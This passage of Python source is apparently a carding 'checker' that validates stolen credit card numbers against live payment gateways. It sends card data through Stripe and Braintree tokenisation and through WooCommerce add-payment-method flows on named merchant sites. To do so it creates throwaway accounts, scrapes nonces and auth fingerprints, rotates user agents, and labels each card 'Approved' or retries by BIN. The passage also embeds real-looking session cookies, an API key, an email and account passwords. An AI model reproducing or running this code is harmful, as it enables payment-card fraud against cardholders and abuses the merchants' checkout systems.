	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'key=pk_live_Lk2wcr8WKXEORwr4he3GSzEL&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54&sid=bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be&referrer=https%3A%2F%2Fwww.brandcrowd.com&time_on_page=27978&card[number]={n}&card[exp_month]=08&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYgOMResgdR8tVVFNz6ArhL0badnemc-IY332cxC2_RT129Rh1Ikfuyk36zFF-RySxke4a6eMVJlA_mD3GG9XWg_Dl9gxH8Duvd8AY2m8220XCcXDUTbgn8MNZQHYJTilwd60ePnVrY2hr0giMBzsyC-PFzl6PU9dGKMpDqCj4ZWszY8Hnp9s_RTTCCRow2HhjlZH7142PDQE2DkXrjQrVwniIiPa9DcpisxgRF4KXCm--kPhVyUnPklBhitoJyxL2QJw-S4oqX0YlPre18Tpmghricsh-jahZfnlc9Su1KTEipIolqrMnYsqza3dOkELAhC_61JYbAZGlaIOb87A7XbUd8LfszKYV-bFZhD1QO58NXyTH0pP_NPAZZJT2Ay7JMStWSCbxI-ze9_B8FX9BFtXKs5U5M1V7gmiqwjT9QCKInMuAWCR0lh-7kR0PtQyJGd4SRUAUylFbAJT92o70X1ssx_TPS6hLqYdvt6pWD82XpLCR49PzcdNjTFs-XBBO2_BwISfx3vVujrSPg7KhZw9kgvA22J91us5MkTlSBk0apP7_NFSe5mnAmJ2R_woIXdlm6ANTXaI7VZiXqUjL3ospqU0sVjYNunzzuhZgE1PsLtzvTb7mAVN3Ypi8v4tA6YG7q8bgNHg8LEIuWVoJ7smmGmW4wVs_c7vt-0PyP-tTzEhcYYB8n_oja2tb1yUJCkLgurWnqCa0IhmiT8eHEouA8uDi3bSGQOtsQ2hmcd0oqRv5dJ-phe37cWOxoWEyff5alVd6fGyhv2n79Qv47chzne9Hv5LPYJ4KYhE6wC2ntKbHgREEbe_Q9EAKgUqpmu6-tTx8uSSDEwTJh7_G_mr3QKHL-OXqRTJBOopsJTLvVZ4eucl_T2opGEgbybxT67YP-3YK0IY6xkHeDxbJydkocIrzffAhlIp3AwuHU-9NsMZdMT9N_DToGxwy3jT0wXIMAxXFS1sq7WkWWM20Nv4cFLReorGop597X-uZx-6jg8-x3YMmBBiATxKvLCdxLF_Rp2qi6yBwufT23hHtUabq0NmtN3P8ITO4sa-8e60XDHRslZ3u1r40ASSQxJvgksP47a79CybmonrJ-WFL10pK2LuvS1aa1ElYNBVBGoG_Cxk5xkgedIJTSUNlDAUxxWtx0IdrW0GwRTG83w1jZ6j49VXX0hLhy-h5IG0AN5Y1B14zvHkTtRwsTxuc1rz2i1IiqdsBY4qARNPXT33lyZwhpw_f4Er4AzY0gj9zVCT-nZeYBPCJfjk--fbyCQbuJ62DniQE7bFBwCzNKqW08F8wk4czJKLGJwvj6oJrcpIicWFp7r6uM3E3sQMM3caZCOMvYe0pl-D5bqRjmngHCjcIfKfuoCExUCD3WTZhCOWMmScpnf1Ko1CShzEa8N7QES0x-LQgh3694gK0WqEc4q7sOlXvbRTYBeWYizlV6v-waz5cBtwm03JrGPQnEWlQeKCA0Jti5dILqQL-kS9Q9V69vMsnuWcIbkWQ_EfkI4T3g5PatgwmIjIAyGSkJ6QA4N2rdUKIJaCG3lyxOMkqMgr4ePm6s11n6hX15ZKfg2Mrg0gBZC47x4hWNxcctyAEtJqMCriS61YeaYp6O9JYoxNQ80e3q7RNVZSWSmMtKGzG-UGjamhVEP5nsBhDvRhoG2g61OTWpz3K8jrOoiyVOU3nD79b-uY2j_EiKgG41_7rf8Hxz2l35TflgeFB0tKbQWgP9uKW3gGJh97DQ8qwpRPiHoq4DV96kR-DiHI5z1qKNQiyWyJe8VfhktzbSEqzYr1fddy2h6xZkNX-GxcjlKIBa_mEnbE62GHzTKcX6UjGOtCapBBsBhsiCJ2T2YngKTQ8_mFNCfiLYH5RJ2L4lkZeU9_jPFZYMFtYbLufTZXm6ceYeg3cwmqFR_UdozNym4MLdZFpkKcwD5CRkIUPZvQ-35DnSowx_LkFmYvp4-8JvKbMr_Lgj5obZm5Dq_HVvzElL4haUXJtMKqO9Z45THYsJULYX49r1-NBPJ6bvkQIA4x50kma6FscgAK7GMjVMRlCGzsC-HrN2U9F69eyqwaUKCKWM2rDzHhibyaKWAzSjZXhwzmZHeKioc2hhcmRfaWTOAzGDb6JrcqgzNDE3OWE4ZKJwZAA.uKPrI9DFPyAAy5YHaxw9ML99H7z9q6y_pFG2MRbJkJU&payment_user_agent=stripe.js%2F315906f414%3B+stripe-js-v3%2F315906f414%3B+split-card-element'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	cookies = {
	    'bc_a': 'CfDJ8IvzqFzHTtFGoh34l-99SRY7oWAc10G-K7k3nMjvLFN8oK57yIunkGFVP0EpjjPiRMuDpJyfQxYW8ne1v-JawlnOw5ypoAk_0Okr6Uae_vGyf0xRLDpU93LW_JSCQZxzKlMbXa69th4VAdFfwh2rQ7fCSsD_N8WNwd4b5-ewbpyL83kvUcc5FWMY99XPngmYzCzejcUZl7uMb2OiBcShftgiTQ6FebGT5buB9-krcy1-MCRuqiARpcbIYfZyjYEPbJc5goAH930FXL6R6GU1CbS61pvYtRtXaEeTrNFjqhnOCgG4U7SOU1lVdAmga0-RCaulTfCPcca3KoJNzodwka82PddM7yldUO6K-WDNbGY3skD9Wz0VqXy1tJFydmG7RfQX9pYCaN6b9-3eUZIKP0t8bR969OjAI7K0Ir2Eo8qTXpXAT6KLdbmERxOK2xdXyfKM6M_aoQoo5Uq4GRuCzkobILoXUuAp4Pq5cSv0666an1zJQH8QqZ_AmVI8IRs6Ze3E8i55fJkMl1hOPs2Yiq0xsEUnrCHXJk7i_eZFd1kxNjg7KcZIpT8R9nu5SiirRU9_EkdXrKBNRofDZY8ECxBe-vsbyWJLMDM3BDkKv10yD5FLLmnOUAN-f9e6yEoMmm_-liKfANQRr8edtEbyZrvjy1bsZyz43ZRbqGcNUFliC9p6wswGotlXlZeGviekuCQvAG0ml6UlvCiyUmbWMxFTkZTCTuB5PaOkxlzxSJqOs2AREASo7xgIbfMB_ql43VtZIVwKwF0r0R06s-w9l6hGKXyorj4cywwSTMyhCpr2JSpdv0xbdSS5R4PtXGa46d0mWMZlrIa94PFt8rJ1cyNSlnnvQcXWcSYx3PdnLua8eVUCaU3cuC_rCafjvjNmSsdYkJjSpUqQ2qjF43edUenueGZ6jSInRNqYn4CEis_Y15uXBEelgYOCXfDbJnT0hHAjMKeAN8cZS0rzc_Mg7GA8oWbPFMAcZoe3AIn-jYeELhakFDLNVNZeZEprKhs0Kq5Zh6EqxGPdYmavUkVwuAcE28ZEDNEEysQaPk1b8f7DjfoBdGAdo41zf5pqcJ92WwOoe2jQ7v1Z82935BwaM78lnDsbKkluIk0bgm5qoFFYJi71mErwnq2YHDiJso5kEhtJCFKquzmlhL1YvTs1evwP3fPtyIA_06hz45I-AXnqbLtKHEHDn_oeT9_rVt6SeAhUfiXQF2hJaZWU9iuOCNh1he_f6br7UHJGTtXmUCcgn5yj0Ri7Y-i8dAzZyKL8kEOVeBiBnwGKo36OEopPb5jTo77elMMJwA-1-Wh7dTr-uQg4Vct-MrfgQA_XdpkfqLhLuQFIN2laGmpU_vJOhPrW7J2GptUAEMSqh8JYO6pn_eo9etBBkRK0ZyA9lHcrNj981dyQikHH5OPSZmfANUW6GU8874On6Qp0vEJFOUoDL94SQyVtCArBWJuvqD3dhB6HtIu8f2INQ9MSD3hgpNKjbJ172Pqq01EB5RuXiqCJAXUXIkYi1a6K9GgEWRXq-uHZ-9lE0oTzVimYM002QQWezoF_hFWqbowasQcp_8W6',
	    'ab.storage.userId.10402dcf-98a1-474c-92da-ec52a09a8616': '%7B%22g%22%3A%2239a7fd30-d222-418a-bfd1-1d6618a66987%22%2C%22c%22%3A1715832234405%2C%22l%22%3A1715832234405%7D',
	    '__stripe_mid': '8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54',
	    '_gcl_au': '1.1.1204692422.1715832241',
	    '_ga': 'GA1.1.1542255616.1715832242',
	    '_fbp': 'fb.1.1715832242582.1432169573',
	    '_tt_enable_cookie': '1',
	    '_ttp': 'BPXdM3jII8Ha5tePvZzAaP8r5sO',
	    'brandcrowd-user-session-id': '5b01b3b0-4dcf-bf57-f2c2-b308af000a3c',
	    'bc_s': 'CfDJ8IvzqFzHTtFGoh34l%2B99SRbG5eA35O5x2hhLOXtP2UbzZYJJOhfUttYNBI5Ch03Tg3CgxaOMpgyRRT0nSlpi75%2Fr%2FT5l%2FIDDMpa5zzEodNuJku6ozMMa%2BLXVNV6ifgskIlT2q2vOZPH2mqu2ObF51hMtEkWWC0LKzn%2FS1kF0otzP',
	    'ab.storage.sessionId.10402dcf-98a1-474c-92da-ec52a09a8616': '%7B%22g%22%3A%22e7d76a1a-78e4-7faa-cf2a-3aa0d60d44c3%22%2C%22e%22%3A1715961640890%2C%22c%22%3A1715959840895%2C%22l%22%3A1715959840895%7D',
	    'mp_878a43cbe7b74f3d409d4392b3c63831_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A18f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24device_id%22%3A%20%2218f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22utm_source%22%3A%20null%2C%22utm_medium%22%3A%20null%2C%22utm_campaign%22%3A%20null%2C%22utm_content%22%3A%20null%2C%22utm_term%22%3A%20null%7D',
	    '.AspNetCore.Antiforgery.TcmPAuy1nOM': 'CfDJ8IvzqFzHTtFGoh34l-99SRbEwYfUT7toqE-1-OyjriQn8yvjPhVNqvSroUVsI5NXFZM0Ukz-BAN-fSYJM3VVH0Ta3muBALlhmMBrhf_E3xUs4m77feAQ7GJ8ty5Xzlp_aJELnwLTRBKnIOffpHGUZ9Q',
	    '__stripe_sid': 'bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be',
	    '_uetsid': '7180d090146211ef89aded17c728abeb',
	    '_uetvid': '86617bc0d01d11ee9148db38439bde60',
	    '_ga_FFRLYW6TZ1': 'GS1.1.1715959850.2.1.1715959851.59.0.0',
	    'brandcrowd-search': 'DefaultSearchV4',
	    'bc-gt-2469-local-pricing-lower-wtp': 'gt-2469-variation-1',
	    'bc-gt-4683-three-package-pricing': 'gt-4683-disabled',
	    'bc-gt-2728-2-year-subs': 'gt-2728-disabled',
	    'brandcrowd-price-context': '25OFFSEM',
	    'bc-gt-4692-free-logos-2024': 'gt-4692-excluded',
	    'bc-gt-5041-cookie-consent-alternatives': 'gt-5041-excluded',
	    'bc-gt-5292-auth-copy-validity': 'gt-5292-variation-1',
	}
	
	headers = {
	    'authority': 'www.brandcrowd.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'bc_a=CfDJ8IvzqFzHTtFGoh34l-99SRY7oWAc10G-K7k3nMjvLFN8oK57yIunkGFVP0EpjjPiRMuDpJyfQxYW8ne1v-JawlnOw5ypoAk_0Okr6Uae_vGyf0xRLDpU93LW_JSCQZxzKlMbXa69th4VAdFfwh2rQ7fCSsD_N8WNwd4b5-ewbpyL83kvUcc5FWMY99XPngmYzCzejcUZl7uMb2OiBcShftgiTQ6FebGT5buB9-krcy1-MCRuqiARpcbIYfZyjYEPbJc5goAH930FXL6R6GU1CbS61pvYtRtXaEeTrNFjqhnOCgG4U7SOU1lVdAmga0-RCaulTfCPcca3KoJNzodwka82PddM7yldUO6K-WDNbGY3skD9Wz0VqXy1tJFydmG7RfQX9pYCaN6b9-3eUZIKP0t8bR969OjAI7K0Ir2Eo8qTXpXAT6KLdbmERxOK2xdXyfKM6M_aoQoo5Uq4GRuCzkobILoXUuAp4Pq5cSv0666an1zJQH8QqZ_AmVI8IRs6Ze3E8i55fJkMl1hOPs2Yiq0xsEUnrCHXJk7i_eZFd1kxNjg7KcZIpT8R9nu5SiirRU9_EkdXrKBNRofDZY8ECxBe-vsbyWJLMDM3BDkKv10yD5FLLmnOUAN-f9e6yEoMmm_-liKfANQRr8edtEbyZrvjy1bsZyz43ZRbqGcNUFliC9p6wswGotlXlZeGviekuCQvAG0ml6UlvCiyUmbWMxFTkZTCTuB5PaOkxlzxSJqOs2AREASo7xgIbfMB_ql43VtZIVwKwF0r0R06s-w9l6hGKXyorj4cywwSTMyhCpr2JSpdv0xbdSS5R4PtXGa46d0mWMZlrIa94PFt8rJ1cyNSlnnvQcXWcSYx3PdnLua8eVUCaU3cuC_rCafjvjNmSsdYkJjSpUqQ2qjF43edUenueGZ6jSInRNqYn4CEis_Y15uXBEelgYOCXfDbJnT0hHAjMKeAN8cZS0rzc_Mg7GA8oWbPFMAcZoe3AIn-jYeELhakFDLNVNZeZEprKhs0Kq5Zh6EqxGPdYmavUkVwuAcE28ZEDNEEysQaPk1b8f7DjfoBdGAdo41zf5pqcJ92WwOoe2jQ7v1Z82935BwaM78lnDsbKkluIk0bgm5qoFFYJi71mErwnq2YHDiJso5kEhtJCFKquzmlhL1YvTs1evwP3fPtyIA_06hz45I-AXnqbLtKHEHDn_oeT9_rVt6SeAhUfiXQF2hJaZWU9iuOCNh1he_f6br7UHJGTtXmUCcgn5yj0Ri7Y-i8dAzZyKL8kEOVeBiBnwGKo36OEopPb5jTo77elMMJwA-1-Wh7dTr-uQg4Vct-MrfgQA_XdpkfqLhLuQFIN2laGmpU_vJOhPrW7J2GptUAEMSqh8JYO6pn_eo9etBBkRK0ZyA9lHcrNj981dyQikHH5OPSZmfANUW6GU8874On6Qp0vEJFOUoDL94SQyVtCArBWJuvqD3dhB6HtIu8f2INQ9MSD3hgpNKjbJ172Pqq01EB5RuXiqCJAXUXIkYi1a6K9GgEWRXq-uHZ-9lE0oTzVimYM002QQWezoF_hFWqbowasQcp_8W6; ab.storage.userId.10402dcf-98a1-474c-92da-ec52a09a8616=%7B%22g%22%3A%2239a7fd30-d222-418a-bfd1-1d6618a66987%22%2C%22c%22%3A1715832234405%2C%22l%22%3A1715832234405%7D; __stripe_mid=8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54; _gcl_au=1.1.1204692422.1715832241; _ga=GA1.1.1542255616.1715832242; _fbp=fb.1.1715832242582.1432169573; _tt_enable_cookie=1; _ttp=BPXdM3jII8Ha5tePvZzAaP8r5sO; brandcrowd-user-session-id=5b01b3b0-4dcf-bf57-f2c2-b308af000a3c; bc_s=CfDJ8IvzqFzHTtFGoh34l%2B99SRbG5eA35O5x2hhLOXtP2UbzZYJJOhfUttYNBI5Ch03Tg3CgxaOMpgyRRT0nSlpi75%2Fr%2FT5l%2FIDDMpa5zzEodNuJku6ozMMa%2BLXVNV6ifgskIlT2q2vOZPH2mqu2ObF51hMtEkWWC0LKzn%2FS1kF0otzP; ab.storage.sessionId.10402dcf-98a1-474c-92da-ec52a09a8616=%7B%22g%22%3A%22e7d76a1a-78e4-7faa-cf2a-3aa0d60d44c3%22%2C%22e%22%3A1715961640890%2C%22c%22%3A1715959840895%2C%22l%22%3A1715959840895%7D; mp_878a43cbe7b74f3d409d4392b3c63831_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24device_id%22%3A%20%2218f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22utm_source%22%3A%20null%2C%22utm_medium%22%3A%20null%2C%22utm_campaign%22%3A%20null%2C%22utm_content%22%3A%20null%2C%22utm_term%22%3A%20null%7D; .AspNetCore.Antiforgery.TcmPAuy1nOM=CfDJ8IvzqFzHTtFGoh34l-99SRbEwYfUT7toqE-1-OyjriQn8yvjPhVNqvSroUVsI5NXFZM0Ukz-BAN-fSYJM3VVH0Ta3muBALlhmMBrhf_E3xUs4m77feAQ7GJ8ty5Xzlp_aJELnwLTRBKnIOffpHGUZ9Q; __stripe_sid=bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be; _uetsid=7180d090146211ef89aded17c728abeb; _uetvid=86617bc0d01d11ee9148db38439bde60; _ga_FFRLYW6TZ1=GS1.1.1715959850.2.1.1715959851.59.0.0; brandcrowd-search=DefaultSearchV4; bc-gt-2469-local-pricing-lower-wtp=gt-2469-variation-1; bc-gt-4683-three-package-pricing=gt-4683-disabled; bc-gt-2728-2-year-subs=gt-2728-disabled; brandcrowd-price-context=25OFFSEM; bc-gt-4692-free-logos-2024=gt-4692-excluded; bc-gt-5041-cookie-consent-alternatives=gt-5041-excluded; bc-gt-5292-auth-copy-validity=gt-5292-variation-1',
	    'origin': 'https://www.brandcrowd.com',
	    'referer': 'https://www.brandcrowd.com/checkout/77b446d1-833b-4e33-9b56-71fe5ce24348',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'CartToken': '77b446d1-833b-4e33-9b56-71fe5ce24348',
	    'IsPaymentRequired': 'true',
	    'PayerToken': id,
	    'WalletType': '',
	    'SelectedDiscountCode': '',
	    'SelectedTaxId': '',
	    'PurchaseInstructions': '',
	    'IsFreeTrial': 'false',
	    'UserEmail': 'markkeep72@gmail.com',
	    'ShippingAddress.Name': '',
	    'ShippingAddress.Street1': '',
	    'ShippingAddress.Street2': '',
	    'ShippingAddress.City': '',
	    'ShippingAddress.State': '',
	    'ShippingAddress.ZipCode': '',
	    'ShippingAddress.Country': '',
	    'ShippingAddress.Id': '0',
	    'ShippingAddress.IsPrimary': 'true',
	    'PayerTokenType': 'stripe',
	}
	
	response = requests.post(
	    'https://www.brandcrowd.com/maker/checkout/77b446d1-833b-4e33-9b56-71fe5ce24348',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	last=(response.text)
	soup = BeautifulSoup(last, 'html.parser')	
	if not 'tight">Error</p><' in last:
		if 'success' in last or 'Thank' in last or 'Subscribed' in last:
			return 'success'
	else:
		result = soup.find('p', class_='tw-text-base tw-text-white tw-m-0 tw-leading-tight tw-mb-2 lg:tw-mb-0')
		if result:
			return(result.text)
		else:
			return '#Your card has been declined'
def chk(card):
	import requests, re, base64, random, string, time
	from fake_useragent import UserAgent
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	ua = UserAgent()
	user = ua.random
	corr = 'bcgvcdc'
	sess = 'vsgvxdf'
	varps=['H1','H2','H3','H4','H5','H6','H7','H8','H9','H10']
	headers = {'user-agent': user}
	from http import cookies
	def up(varp):
		r = requests.session()
		name = ''.join(random.choices(string.ascii_lowercase, k=15))
		acc=f"{name}@closetab.com"
		headers = {'user-agent': user}
		response = r.get('https://bayoulandleather.com/my-account/', headers=headers)
		nonce = (re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1))
		data = {
		    'email': acc,
		    'wc_order_attribution_user_agent': user,
		    'woocommerce-register-nonce': nonce,
		    '_wp_http_referer': 'https://bayoulandleather.com/my-account/add-payment-method/',
		    'register': 'Register',
		}
		response = r.post('https://bayoulandleather.com/my-account/add-payment-method/', headers=headers, data=data)
		enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
		dec = base64.b64decode(enc).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
		add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
			new_data = {
					 varp : {
		  "nonce": nonce,
		  "au": au
					}
				
		}
		try:
			existing_data['chk'].update(new_data)
		except:
			new_data = {"chk": {
			 varp : {
		  "nonce": nonce,
		  "au": au
					}
				}
			}
		
			existing_data.update(new_data)
		import pickle
		import http.cookiejar
		with open(f'chk_{varp}.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	with open('filechk.txt', 'r') as file:
		last_acc = file.readline()
	while True:
		varp = random.choice(varps)
		if last_acc==varp:
			pass
		else:
			break
	try:
		nonce=json_data['chk'][varp]['nonce']
		au=json_data['chk'][varp]['au']
		import pickle
		import http.cookiejar
		with open(f'chk_{varp}.pkl', 'rb') as f:
			c = pickle.load(f)
		r = requests.session()
		r.cookies=c
	except Exception as e:
		print(e)
		for varp in varps:
			up(varp)		
	header = {
	    'accept': '*/*',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'Pragma': 'no-cache',
	    'user-agent': user,
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'accd43a0-58d1-493b-94a9-76bb1a2fa359',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '90011',
	                    'streetAddress': '',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	response = requests.post('https://payments.braintree-api.com/graphql', headers=header, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for varp in varps:
			up(varp)
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"'+sess+'","fraud_merchant_id":null,"correlation_id":"'+corr+'"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/bxynhfj8s242wzvz/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/bxynhfj8s242wzvz"},"merchantId":"bxynhfj8s242wzvz","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":false}',
	    'woocommerce-add-payment-method-nonce': nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = r.post(
	    'https://bayoulandleather.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'avs' in result or 'Invalid postal code' in result or 'Insufficient Funds' in result:
			return 'Approved'
		elif 'Please wait for 20 seconds' in result:
			return "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds' in result:
			return "RISK: Retry this BIN later."
	else:
		result=text
	if '<head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.</p></body></html>' in response.text:
		return "RISK: Retry this BIN later."
		
	if 'Payment method successfully added.' in text:
		return "1000: Approved"
	elif 'risk_threshold' in text:
		return "RISK: Retry this BIN later."
	elif 'Please wait for 20 seconds' in text:
		return "RISK: Retry this BIN later."
	else:
		for varp in varps:
			up(varp)
		return "RISK: Retry this BIN later."
def pro(ccx):
	import requests,re,base64,json,random
	from fake_useragent import UserAgent
	from bs4 import BeautifulSoup
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	ua = UserAgent()
	user = ua.random
	r = requests.session()
	varps=['voveb21610@wappol.com','dibew99495@wappol.com']
	def up(varp):
		r = requests.session()
		headers = {'user-agent': user}
		response = r.post('https://honeybros.com/my-account/add-payment-method/',headers=headers)
		nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))		
		data = {
		    'username': varp,
		    'password': 'AS12345$',
		    'woocommerce-login-nonce': nonce,
		    '_wp_http_referer': '/my-account/add-payment-method',
		    'login': 'Log in',
		}
		
		response = r.post('https://honeybros.com/my-account/add-payment-method', cookies=r.cookies, headers=headers, data=data)
		print(response.text)
		nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
		JWT_nonce=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]
		headers = {
			'authority': 'https://honeybros.com',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'origin': 'https://honeybros.com',
			'referer': 'https://honeybros.com/my-account/add-payment-method/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Linux"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
		}
		
		data = {
			'action': 'wc_braintree_credit_card_get_client_token',
			'nonce': JWT_nonce,
		}
		response = requests.post('https://honeybros.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
		no=response.json()['data']
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
					 varp : {
		  "nonce": nonce,
		  "au": au
					}
				
		}
		try:
			existing_data['pro'].update(new_data)
		except:
			new_data = {"pro": {
			 varp : {
		  "nonce": nonce,
		  "au": au
					}
				}
			}
		
			existing_data.update(new_data)
		import pickle
		import http.cookiejar
		with open(F'pro_{varp}.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	with open('filepro.txt', 'r') as file:
		last_acc = file.readline()
	while True:
		varp = random.choice(varps)
		if last_acc==varp:
			pass
		else:
			break
	try:
		nonce=json_data['pro'][varp]['nonce']
		au=json_data['pro'][varp]['au']
		import pickle
		import http.cookiejar
		with open(f'pro_{varp}.pkl', 'rb') as f:
			c = pickle.load(f)
		r = requests.session()
		r.cookies=c
	except Exception as e:
		for varp in varps:
			up(varp)
		print(e)
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'e1636f23-9ffd-4a20-b820-03fa00946fa5',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
